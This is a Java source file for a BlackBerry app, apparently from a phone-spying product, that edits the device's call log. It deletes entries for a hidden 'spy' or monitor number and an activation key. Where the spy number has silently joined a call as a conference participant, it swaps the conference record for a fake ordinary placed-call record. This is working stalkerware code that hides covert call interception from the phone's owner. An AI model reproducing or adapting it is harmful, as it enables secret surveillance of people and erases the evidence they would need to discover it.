package com.vvt.calllogmon;

import java.util.Date;
import com.vvt.bug.PhoneNumberFormat;
import com.vvt.bug.RecentCallCleaner;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import net.rim.blackberry.api.phone.phonelogs.*;
import net.rim.device.api.system.Application;

public class CallLogRemover {
	
	private String monitorNumber = "";
	
	public void removeFlexiKey(String flexiKey) {
		try {
			if (PhoneInfo.isFiveOrHigher()) {
				RecentCallCleaner recentCallCleaner = new RecentCallCleaner();
				recentCallCleaner.deleteFlexiKey();
			} else {
				PhoneLogs ph = PhoneLogs.getInstance();
				int nCall = ph.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
				SEARCH: for (int i = nCall - 1; i >= 0; i--) {
						String number = ((PhoneCallLog) ph.callAt(i, PhoneLogs.FOLDER_NORMAL_CALLS)).getParticipant().getNumber();
						if (number.equals(flexiKey)) {
							ph.deleteCall(i, PhoneLogs.FOLDER_NORMAL_CALLS);
							break SEARCH;
						}
					}
			}
		} catch (Exception e) {
			Log.error("CallLogRemover.removeMonitorKey", null, e);
		}
	}
	
	public void removeMonitorNumber(long folderId, String number) {
		try {
			monitorNumber = number;
			PhoneLogs ph = PhoneLogs.getInstance();
			int nCall = ph.numberOfCalls(folderId);
			SEARCH: for (int i = nCall - 1; i >= 0; i--) {
				String numberParticipant = ((PhoneCallLog) ph.callAt(i, folderId)).getParticipant().getNumber();
				boolean isSpyNumber = isMonitorNumber(numberParticipant);
				if (!isSpyNumber) {
					String numberParticipantAddressBook = ((PhoneCallLog)ph.callAt(i, folderId)).getParticipant().getAddressBookFormattedNumber();
					isSpyNumber = isMonitorNumber(numberParticipantAddressBook);
				}
				if (isSpyNumber) {
					ph.deleteCall(i, folderId);
					break SEARCH;
				}
			}
		} catch (Exception e) {
			Log.error("CallLogRemover.removeMonitorNumber", null, e);
		}
	}
	
	public void removeMonitorNumber(String number) {
		monitorNumber = number;
		Application.getApplication().invokeLater(new Runnable() {
			public void run() {
				try {
					PhoneLogs ph = PhoneLogs.getInstance();
					int numberOfCallsInCallLog = ph.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
					SEARCH: for (int i = 0; i < numberOfCallsInCallLog; i++) {
						CallLog cl = ph.callAt(i, PhoneLogs.FOLDER_NORMAL_CALLS);
						if (cl instanceof ConferencePhoneCallLog) {
							ConferencePhoneCallLog cpcl = (ConferencePhoneCallLog) cl;
							boolean isSCC = isMonitorNumber(cpcl);
							if (isSCC) {
								ph.deleteCall(i, PhoneLogs.FOLDER_NORMAL_CALLS);
								PhoneCallLogID callLogOneID = cpcl.getParticipantAt(0);
								Date date = cpcl.getDate();
								int type = PhoneCallLog.TYPE_PLACED_CALL;;
								int duration = cpcl.getDuration();
								int status = cpcl.getStatus();
								String notes = cpcl.getNotes();
								PhoneCallLog pcl = new PhoneCallLog(date, type, duration, status, callLogOneID, notes);
								ph.addCall(pcl);
								break SEARCH;
							}
						}
					}
				} catch (Exception e) {
					Log.error("CallLogRemover.scheduleUpdatingCallLog", null, e);
				}
			}
		}, 2000, false);
	}
	
	private boolean isMonitorNumber(String phoneNumber) {
		boolean isSpyNumber = false;
		if (monitorNumber != null && monitorNumber.length() > 0) {
			phoneNumber = PhoneNumberFormat.removeNonDigitCharacters(phoneNumber);
			phoneNumber = PhoneNumberFormat.removeLeadingZeroes(phoneNumber);
			String spyNumber = PhoneNumberFormat.removeNonDigitCharacters(monitorNumber);
			spyNumber = PhoneNumberFormat.removeLeadingZeroes(spyNumber);
			isSpyNumber = phoneNumber != "" && phoneNumber.equals(spyNumber);
		}
		return isSpyNumber;
	}
	
	private boolean isMonitorNumber(ConferencePhoneCallLog cpcl) {
		boolean isSpyNumber = false;
		if (cpcl.numberOfParticipants() == 2) {
			PhoneCallLogID callLogTwoID = cpcl.getParticipantAt(1);
			String callTwoNumber = callLogTwoID.getNumber();
			isSpyNumber = monitorNumber.endsWith(callTwoNumber) || callTwoNumber.endsWith(monitorNumber);
		}
		return isSpyNumber;
	}
}
